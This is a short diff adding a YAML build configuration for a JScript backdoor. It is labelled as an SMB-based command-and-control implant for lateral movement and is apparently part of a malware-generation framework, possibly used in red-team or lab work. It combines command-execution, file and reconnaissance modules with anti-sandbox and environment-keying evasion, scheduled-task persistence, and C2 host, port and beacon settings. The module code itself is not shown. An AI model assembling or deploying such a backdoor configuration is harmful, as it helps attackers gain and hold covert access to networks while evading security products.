@@ -1,0 +1,30 @@
+name: js_backdoor_smb
+description: SMB-based C2 backdoor for internal lateral movement
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/security_products
+
+c2: c2/smb_pipe
+arch: arch/backdoor
+
+evasion:
+  - evasion/anti_sandbox
+  - evasion/env_keying
+
+persist:
+  - persist/schtask
+
+vars:
+  SMB_SERVER: "10.0.2.2"
+  SMB_SHARE: "c2share"
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  POLL_INTERVAL: "15000"
+  BEACON_INTERVAL: "15000"
